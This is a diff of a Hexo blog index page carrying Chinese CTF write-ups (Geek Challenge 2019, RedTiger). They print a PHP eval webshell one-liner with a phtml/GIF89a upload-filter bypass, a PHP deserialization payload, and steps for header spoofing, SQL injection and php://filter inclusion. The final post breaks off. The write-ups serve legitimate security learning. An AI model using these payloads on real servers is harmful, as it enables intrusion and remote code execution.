@@ -1,503 +1,1048 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-  <head>
-  <meta charset="utf-8">
-  <meta name="author" content="zchengsite, 1451426471@qq.com" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  
-    <meta name="robots" content="noindex" />
-  
-  
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"silver-glacier.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://silver-glacier.github.io/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="Glacier">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://silver-glacier.github.io/page/2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
   <title>Hexo</title>
-
-  
-    <link rel="apple-touch-icon" href="/images/favicon.png">
-    <link rel="icon" href="/images/favicon.png">
   
 
-  <!-- Raleway-Font -->
-  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
-
-  <!-- hexo site css -->
-  
-<link rel="stylesheet" href="/css/base.css">
-<link rel="stylesheet" href="/iconfont/iconfont.css">
-<link rel="stylesheet" href="/css/github-markdown.css">
-<link rel="stylesheet" href="/css/highlight.css">
 
 
-  <!-- jquery3.3.1 -->
-  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
-
-  <!-- fancybox -->
-  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
-  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
-  
-<script src="/js/fancybox.js"></script>
 
 
-  
 
-<meta name="generator" content="Hexo 5.2.0"></head>
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
 
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
 
-  <body>
-    <div id="app">
-      <div class="header">
-  <div class="avatar">
-    <a href="/">
-      <!-- 头像取消懒加载，添加no-lazy -->
-      
-        <img src="/images/avatar.png" alt="">
-      
-    </a>
-    <div class="nickname"><a href="/">Oranges</a></div>
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
   </div>
-  <div class="navbar">
-    <ul>
-      
-        <li class="nav-item" data-path="/">
-          <a href="/">Home</a>
-        </li>
-      
-        <li class="nav-item" data-path="/archives/">
-          <a href="/archives/">Archives</a>
-        </li>
-      
-        <li class="nav-item" data-path="/tags/">
-          <a href="/tags/">Tags</a>
-        </li>
-      
-        <li class="nav-item" data-path="/friends/">
-          <a href="/friends/">Friends</a>
-        </li>
-      
-        <li class="nav-item" data-path="/about/">
-          <a href="/about/">About</a>
-        </li>
-      
-    </ul>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
   </div>
 </div>
 
 
-<script src="/js/activeNav.js"></script>
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
 
 
 
-      <div class="flex-container">
-        <div class="container index">
-  <div class="post-list">
-    <!-- 遍历渲染文章 -->
+
+</div>
+    </header>
+
     
-      <div class="post-item" title="极客大挑战2019-upload">
-        <div class="time-m-d">2021-01-30</div>
-        <div class="title">
-          <a href="/2021/01/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/">
-            
-              
-                <span>极客大挑战2019-upload</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="极客大挑战2019-php">
-        <div class="time-m-d">2021-01-28</div>
-        <div class="title">
-          <a href="/2021/01/28/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-php/">
-            
-              
-                <span>极客大挑战2019-php</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="极客大挑战2019_Http">
-        <div class="time-m-d">2021-01-24</div>
-        <div class="title">
-          <a href="/2021/01/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/">
-            
-              
-                <span>极客大挑战2019_Http</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="极客大挑战2019_LoveSQL1">
-        <div class="time-m-d">2021-01-23</div>
-        <div class="title">
-          <a href="/2021/01/23/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/">
-            
-              
-                <span>极客大挑战2019_LoveSQL1</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="极客大挑战2019_secret_file">
-        <div class="time-m-d">2021-01-20</div>
-        <div class="title">
-          <a href="/2021/01/20/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-secret-file/">
-            
-              
-                <span>极客大挑战2019_secret_file</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="redtiger_forth">
-        <div class="time-m-d">2021-01-17</div>
-        <div class="title">
-          <a href="/2021/01/17/redtiger-forth/">
-            
-              
-                <span>redtiger_forth</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="redtiger_third">
-        <div class="time-m-d">2021-01-16</div>
-        <div class="title">
-          <a href="/2021/01/16/redtiger-third/">
-            
-              
-                <span>redtiger_third</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="XCTF-4th-CyberEarth">
-        <div class="time-m-d">2021-01-14</div>
-        <div class="title">
-          <a href="/2021/01/14/XCTF-4th-CyberEarth/">
-            
-              
-                <span>XCTF-4th-CyberEarth</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="XCTF-4th-WHCTF-2017">
-        <div class="time-m-d">2021-01-09</div>
-        <div class="title">
-          <a href="/2021/01/09/XCTF-4th-WHCTF-2017/">
-            
-              
-                <span>XCTF-4th-WHCTF-2017</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="网鼎杯2018">
-        <div class="time-m-d">2021-01-08</div>
-        <div class="title">
-          <a href="/2021/01/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018/">
-            
-              
-                <span>网鼎杯2018</span>
-              
-            
-          </a>
-        </div>
-      </div>
-    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
   </div>
-  <nav class="post-navigation">
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/01/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload/" class="post-title-link" itemprop="url">极客大挑战2019-upload</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-01-30 13:31:34 / Modified: 13:37:54" itemprop="dateCreated datePublished" datetime="2021-01-30T13:31:34+08:00">2021-01-30</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
     
-      <a href="/"><i class="iconfont icon-angleleft"></i></a>
     
-    <span class="page-num">2 / 3</span>
     
-      <a href="/page/3/"><i class="iconfont icon-angleright"></i></a>
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="极客大挑战2019-upload"><a href="#极客大挑战2019-upload" class="headerlink" title="极客大挑战2019 upload"></a>极客大挑战2019 upload</h1><p>首先打开题目，还是一样的上传🐎<br><img src="https://i.loli.net/2021/01/30/VLSwGjeiYyrUJHO.png"></p>
+<p>一开始直接用php写的🐎好像被它直接过滤掉了，那么我们就用js来写</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>好了</p>
+<p><img src="https://i.loli.net/2021/01/30/3LEXz5xheWQZgfs.png" alt="用burp suite抓包"><br>把🐎先传上去</p>
+<p>这里是学的新知识<br><img src="https://i.loli.net/2021/01/30/pUkbrhlfnuGN6g4.png"><br>先把格式改成phtml，来越过第一个检测，后面在🐎前面加上GIF89a? 构成图片欺骗</p>
+<p><img src="https://i.loli.net/2021/01/30/HtzoAerMgClfjZV.png" alt="上传成功"></p>
+<p>接下来就直接蚁剑连上去就好了</p>
+<p><img src="https://i.loli.net/2021/01/30/AsXk2Rw4lhO89TS.png"><br>这里的url我还找了一会，结果是在/upload里面</p>
+<p><img src="https://i.loli.net/2021/01/30/I4OK95rdHcSoWxv.png"></p>
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+
+      
+    </div>
+
     
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/01/28/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-php/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/28/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-php/" class="post-title-link" itemprop="url">极客大挑战2019-php</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-28 12:41:50" itemprop="dateCreated datePublished" datetime="2021-01-28T12:41:50+08:00">2021-01-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-30 13:32:13" itemprop="dateModified" datetime="2021-01-30T13:32:13+08:00">2021-01-30</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="极客大挑战-I-have-a-cat"><a href="#极客大挑战-I-have-a-cat" class="headerlink" title="极客大挑战 I have a cat"></a>极客大挑战 I have a cat</h1><p>首先打开题目，提示是备份<br><img src="https://i.loli.net/2021/01/30/Bq2sJx6aUZeHoMD.png"><br>那就直接开始扫</p>
+<p><img src="https://i.loli.net/2021/01/30/a4ln7rTxeR8XvfS.png" alt="扫到了"><br>那就下下来看一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">         </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>源码都放上去了</p>
+<p>看了一下大佬的构造</p>
+<blockquote>
+<p> o是对象，s是字符串，i是数字<br>   因为是private修饰的所以要加上%00当空格<br>   构造:0:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/01/30/sWxqE1hJGc3Bt84.png"></p>
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/01/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/" class="post-title-link" itemprop="url">极客大挑战2019_Http</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-01-24 19:38:08 / Modified: 20:03:45" itemprop="dateCreated datePublished" datetime="2021-01-24T19:38:08+08:00">2021-01-24</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="极客大挑战2019-Http"><a href="#极客大挑战2019-Http" class="headerlink" title="极客大挑战2019_Http"></a>极客大挑战2019_Http</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/01/24/4ZatkbUmTuJQzgB.png" alt="好像没有什么信息"><br>用burpsuite看一下有什么东西</p>
+<p><img src="https://i.loli.net/2021/01/24/QCirTqL3XBtxIN9.png"><br>发现了一个Secret.php，打开看一下</p>
+<p><img src="https://i.loli.net/2021/01/24/xEtu5ZfDsi8Vbkn.png" alt="用repeater看一下"><br>有了新的要求，那用referer伪造一下</p>
+<p><img src="https://i.loli.net/2021/01/24/lx3f7pFbKCwkUzL.png" alt="又有新的要求"><br>咱们继续伪造</p>
+<p><img src="https://i.loli.net/2021/01/24/PJUSW9wVZA8RBdM.png" alt="要伪造本地的代理"><br>那就伪造XFF就好了</p>
+<p><img src="https://i.loli.net/2021/01/24/xKHbcLNTnqfp6SU.png"></p>
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/01/23/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/23/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/" class="post-title-link" itemprop="url">极客大挑战2019_LoveSQL1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-23 18:57:27" itemprop="dateCreated datePublished" datetime="2021-01-23T18:57:27+08:00">2021-01-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-24 19:58:52" itemprop="dateModified" datetime="2021-01-24T19:58:52+08:00">2021-01-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="极客大挑战2019-LoveSQL"><a href="#极客大挑战2019-LoveSQL" class="headerlink" title="极客大挑战2019_LoveSQL"></a>极客大挑战2019_LoveSQL</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/01/24/cfYuvnQkemx9JqT.png"><br>根据题目名字，确定这肯定是一个sql注入<br>首先试一下万能密码，看能不能登进去</p>
+<p><img src="https://i.loli.net/2021/01/24/XwKs73EJLgMN9m2.png" alt="成功了"><br>既然万能密码登进去了，那后面的基本上就简单了</p>
+<p><img src="https://i.loli.net/2021/01/24/EH8kTscSl5fNMxV.png"><br>看一下有几组<br><img src="https://i.loli.net/2021/01/24/4ZEe2JYshrfnbmB.png" alt="有三组"></p>
+<p><img src="https://i.loli.net/2021/01/24/Lin6rPtOCFEXkmh.png" alt="看看那些有回显"><br>2和3有回显，那先看一下database</p>
+<p><img src="https://i.loli.net/2021/01/24/AdLCGQYiUFaMnvS.png" alt="查到了database"></p>
+<p>继续查table_name<br><img src="https://i.loli.net/2021/01/24/G8mnbzxBkAUNOfC.png"></p>
+<p>这两个table名中好像是一样的，那就随便看一个<br><img src="https://i.loli.net/2021/01/24/jCzbIOaXhoHAYU2.png"><br>得到三个表名</p>
+<p>最后一步，把他们都显出来<br><img src="https://i.loli.net/2021/01/24/T5vYFOcCxiKSb64.png"></p>
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/01/20/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-secret-file/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/20/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-secret-file/" class="post-title-link" itemprop="url">极客大挑战2019_secret_file</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-01-20 17:26:36 / Modified: 17:36:59" itemprop="dateCreated datePublished" datetime="2021-01-20T17:26:36+08:00">2021-01-20</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="即可大挑战2019-secret-file"><a href="#即可大挑战2019-secret-file" class="headerlink" title="即可大挑战2019 secret file"></a>即可大挑战2019 secret file</h1><p>首先打开题目<br><img src="https://i.loli.net/2021/01/20/X38yAOeDlMGFuEt.png" alt="啥也不是"><br>我们直接去看源码</p>
+<p><img src="https://i.loli.net/2021/01/20/DnB2h3Oig8tN5zV.png"><br>这里发现了一点小秘密<br>题目把这里的颜色调成跟背景颜色一样，所以看不到，那我们直接进到这个./Archieve.php里面去</p>
+<p><img src="https://i.loli.net/2021/01/20/SUtJEe1Mo6sPmxF.png" alt="同样藏了一点东西"><br>那我们还是一样，去到./action.php里面</p>
+<p><img src="https://i.loli.net/2021/01/20/i4ZY1My5e7WUOSK.png" alt="好像不对"><br>它自动跳转到了end.php里面，那就用burp suite去抓包，这次就不会让它跑了</p>
+<p><img src="https://i.loli.net/2021/01/20/i4ZY1My5e7WUOSK.png" alt="发现了"><br>果然有个secr3t.php藏在里面，进去看看</p>
+<p><img src="https://i.loli.net/2021/01/20/qoIuZGkzXn7eOiT.png" alt="看源码"><br>知道了要用filter去越过，找到包含文件</p>
+<p><img src="https://i.loli.net/2021/01/20/UeGTCgcpt28QvLf.png" alt="马上要成功了"><br>然后解码</p>
+<p><img src="https://i.loli.net/2021/01/20/2QUg9ALvemxoybd.png" alt="万能的burp suite"></p>
+<blockquote>
+<p>得到flag!</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/01/17/redtiger-forth/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/17/redtiger-forth/" class="post-title-link" itemprop="url">redtiger_forth</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-17 22:59:01" itemprop="dateCreated datePublished" datetime="2021-01-17T22:59:01+08:00">2021-01-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-20 17:25:35" itemprop="dateModified" datetime="2021-01-20T17:25:35+08:00">2021-01-20</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="redtiger-forth"><a href="#redtiger-forth" class="headerlink" title="redtiger_forth"></a>redtiger_forth</h1><p>Target: Get the value of the first entry in table level4_secret in column keyword<br>Disabled: like<br>看题目是布尔注入<br>随便输入一些东西，指挥返回0和1</p>
+<p>这就去学习了一下布尔类型的sql注入</p>
